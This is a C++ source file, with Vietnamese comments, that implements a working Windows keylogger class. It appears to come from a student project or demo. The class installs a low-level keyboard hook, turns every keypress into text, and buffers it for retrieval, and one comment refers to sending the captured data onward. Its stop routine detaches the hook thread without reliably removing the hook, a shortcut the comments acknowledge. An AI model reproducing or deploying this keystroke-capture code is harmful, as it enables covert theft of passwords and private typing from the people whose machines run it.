#include "Keylogger.h"
#include <iostream>

// Con tro toan cuc de ham tinh KeyboardProc co the goi ve class
Keylogger* g_KeyloggerInstance = nullptr;

Keylogger::Keylogger() : _isRunning(false), _hook(NULL) {
    g_KeyloggerInstance = this;
}

Keylogger::~Keylogger() {
    StopKeyLogging();
    g_KeyloggerInstance = nullptr;
}

// ==========================================
// LOGIC HOOK CUA WINDOWS (STATIC)
// ==========================================
LRESULT CALLBACK Keylogger::KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Neu co su kien phim nhan (WM_KEYDOWN)
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT* pKey = (KBDLLHOOKSTRUCT*)lParam;

        // Goi ve instance de xu ly phim va luu vao buffer
        if (g_KeyloggerInstance) {
            g_KeyloggerInstance->ProcessKey(pKey->vkCode);
        }
    }
    // Chuyen tiep su kien cho cac ung dung khac (de khong bi liet phim)
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

// ==========================================
// XU LY MA PHIM (HELPER)
// ==========================================
void Keylogger::ProcessKey(DWORD vkCode) {
    std::string keyName;

    // Xu ly cac phim dac biet cho de doc
    if (vkCode == VK_RETURN) keyName = "\n";
    else if (vkCode == VK_BACK) keyName = "[BACK]";
    else if (vkCode == VK_SPACE) keyName = " ";
    else if (vkCode == VK_TAB) keyName = "[TAB]";
    else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) keyName = ""; // Bo qua shift don le
    else if (vkCode == VK_CONTROL || vkCode == VK_LCONTROL || vkCode == VK_RCONTROL) keyName = "[CTRL]";
    else if (vkCode == VK_MENU || vkCode == VK_LMENU || vkCode == VK_RMENU) keyName = "[ALT]";
    else if (vkCode == VK_CAPITAL) keyName = "[CAPS]";
    else if (vkCode == VK_ESCAPE) keyName = "[ESC]";
    else {
        // Voi cac phim ky tu thuong (A-Z, 0-9)
        char key = MapVirtualKeyA(vkCode, MAPVK_VK_TO_CHAR);
        if (key != 0) {
            keyName = std::string(1, key);
        }
        else {
            // Cac phim la khac
            keyName = "[" + std::to_string(vkCode) + "]";
        }
    }

    if (!keyName.empty()) {
        // KHOA MUTEX DE GHI FILE AN TOAN
        std::lock_guard<std::mutex> lock(_mutex);
        _logBuffer += keyName;
    }
}

// ==========================================
// VONG LAP CHAY NGAM (THREAD)
// ==========================================
void Keylogger::RunHookLoop() {
    // Cai dat Hook ban phim muc thap (Low Level Keyboard Hook)
    _hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    if (!_hook) {
        // Neu loi cai hook
        return;
    }

    // Message Loop: Bat buoc phai co de Hook hoat dong
    MSG msg;
    while (_isRunning && GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Go Hook khi vong lap ket thuc
    UnhookWindowsHookEx(_hook);
    _hook = NULL;
}

// ==========================================
// CAC HAM PUBLIC
// ==========================================

void Keylogger::StartKeyLogging() {
    if (_isRunning) return; // Dang chay roi thi thoi

    _isRunning = true;
    _logBuffer = "";

    // Tao luong moi de chay ham RunHookLoop
    // (Neu khong tao luong, ham GetMessage se lam treo chuong trinh chinh)
    _loggerThread = std::thread(&Keylogger::RunHookLoop, this);
}

void Keylogger::StopKeyLogging() {
    if (!_isRunning) return;

    _isRunning = false;

    // Gui mot message ao de danh thuc GetMessage va thoat vong lap
    // (PostThreadMessage can ThreadID, o day lam don gian ta ep Hook tu go)
    if (_loggerThread.joinable()) {
        // Cach huy message loop don gian nhat la go hook va cho thread ket thuc
        // Tuy nhien trong thuc te thread dang bi block o GetMessage.
        // De demo don gian, ta detach hoac dung PostThreadMessage neu can ky hon.
        // O muc do do an, ta co the Detach de thread tu huy khi process tat.
        _loggerThread.detach();
    }
}

std::string Keylogger::GetLoggedKeys() {
    // KHOA MUTEX DE DOC DU LIEU
    std::lock_guard<std::mutex> lock(_mutex);

    if (_logBuffer.empty()) return "";

    // Copy du lieu ra
    std::string data = _logBuffer;

    // Xoa buffer cu (de lan sau khong gui lai cai cu nua)
    _logBuffer.clear();

    return data;
}